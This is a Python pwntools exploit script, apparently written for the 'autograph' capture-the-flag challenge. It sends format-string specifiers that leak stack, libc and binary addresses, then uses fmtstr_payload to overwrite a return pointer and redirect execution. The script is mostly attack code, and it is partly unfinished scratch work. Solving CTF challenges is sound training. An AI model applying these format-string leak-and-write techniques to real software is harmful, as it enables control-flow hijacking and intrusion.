from pwn import *

exe = ELF("./autograph")
# libc = ELF("./libc-2.31.so")
# ld = ELF("./ld-2.31.so")

context.binary = exe

p = process("./autograph")
gdb.attach(p)

# p = remote("cybergon2023.webhop.me", 5001)

p.recvuntil(b"Enter choice:")
p.sendline(b"9")
p.recvuntil(b"Enter your notes:")
p.sendline(b"%9$p%37$p%22$p") # 26 _IO_2_1_stdout_
p.recvline()
p.recvline()
leak = p.recvline()

stack_leak = int(leak[:14].decode(),16)
ret_ptr = stack_leak - 0x160

atoi_leak = int(leak[14:28].decode(),16) # for my own libc atm
# libc_base = atoi_leak - 0x83002
atoi_address = atoi_leak - 16
log.success(f"{hex(atoi_address)=}")
# log.success(f"{hex(libc_base)=}")

exe_leak = int(leak[28:42].decode(),16)
exe.address = exe_leak - 0x4060

# _IO_2_1_stdout_ = int(leak[42:56].decode(),16)
# log.success(f"{hex(_IO_2_1_stdout_)=}")

log.success(f"{hex(ret_ptr)=}")

puts_got = exe.got["puts"]
puts_plt = exe.plt["puts"]
ret = exe.address + 0x1016
log.success(f"{hex(ret)=}")
log.success(f"hex(exe.address)={hex(exe.address)}")

first_write = {
    ret_ptr: 0x41414141, 
    ret_ptr+0x8: exe.sym["menu"],
}

payload = fmtstr_payload(6, first_write)
print(payload)

p.recvuntil(b"Enter choice:")
p.sendline(b"9")
p.recvuntil(b"Enter your notes:")
p.sendline(payload)

p.interactive()

